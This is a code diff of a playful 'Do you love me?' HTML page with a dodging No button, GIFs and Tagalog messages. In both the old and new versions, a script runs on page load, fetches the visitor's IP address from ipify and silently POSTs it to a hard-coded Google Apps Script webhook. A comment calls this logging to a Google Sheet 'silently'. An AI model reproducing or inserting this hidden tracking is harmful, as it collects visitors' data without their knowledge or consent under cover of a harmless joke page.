@@ -7,63 +7,57 @@
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      background: #ffe6f0;
-    }
-    img {
-      width: 300px;
-      margin-top: 20px;
+      background: #fff0f5;
+      margin-top: 50px;
     }
     .btn {
-      padding: 12px 20px;
-      margin: 10px;
-      font-size: 18px;
+      padding: 12px 25px;
+      font-size: 20px;
+      margin: 20px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
     }
-    .yes {
-      background-color: #4CAF50;
-      color: white;
-    }
-    .no {
-      background-color: #f44336;
-      color: white;
-      position: relative;
-    }
+    .yes { background-color: #4CAF50; color: white; }
+    .no { background-color: #f44336; color: white; position: relative; }
+    img { width: 250px; margin-top: 20px; }
   </style>
 </head>
 <body>
+
   <h1>Do you love me?</h1>
-  <img id="gif" src="ask.gif" alt="Do you love me?" />
+  <img id="gif" src="ask.gif" alt="Ask GIF" />
+
   <div>
-    <button class="btn yes" onclick="yesClicked()">Yes</button>
-    <button class="btn no" onmouseover="moveNoBtn()">No</button>
+    <button class="btn yes" onclick="yes()">Yes</button>
+    <button class="btn no" onmouseover="moveNo()">No</button>
   </div>
 
-  <h2 id="message"></h2>
+  <h2 id="msg"></h2>
 
   <script>
-    // IP logging via Google Apps Script
     const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbyJbMUN18urZKeqrzcrb-HmN2XCOGr20Um1EuK5b_6bZ8_aMlAqwcUkBdnbfCLAHpQV/exec";
 
-    fetch('https://api.ipify.org?format=json')
+    // Send IP address to Google Sheet silently
+    fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
-        fetch(`${WEBHOOK_URL}?ip=${data.ip}`, { method: 'POST' });
+        fetch(`${WEBHOOK_URL}?ip=${data.ip}`, { method: "POST" });
       });
 
-    function yesClicked() {
-      document.getElementById('gif').src = "yes.gif";
-      document.getElementById('message').innerText = "I knew it! You love me ❤️";
+    // Button functions
+    function yes() {
+      document.getElementById("gif").src = "yes.gif";
+      document.getElementById("msg").innerText = "I knew it! You love me ❤️";
     }
 
-    function moveNoBtn() {
+    function moveNo() {
       const btn = document.querySelector(".no");
-      btn.style.top = Math.random() * 300 + "px";
-      btn.style.left = Math.random() * 300 + "px";
       btn.style.position = "absolute";
-      document.getElementById('gif').src = "no.gif";
-      document.getElementById('message').innerText = "Aww bakit? 😢";
+      btn.style.top = Math.random() * 400 + "px";
+      btn.style.left = Math.random() * 300 + "px";
+      document.getElementById("gif").src = "no.gif";
+      document.getElementById("msg").innerText = "Aww, bakit naman 😢";
     }
   </script>
 </body>
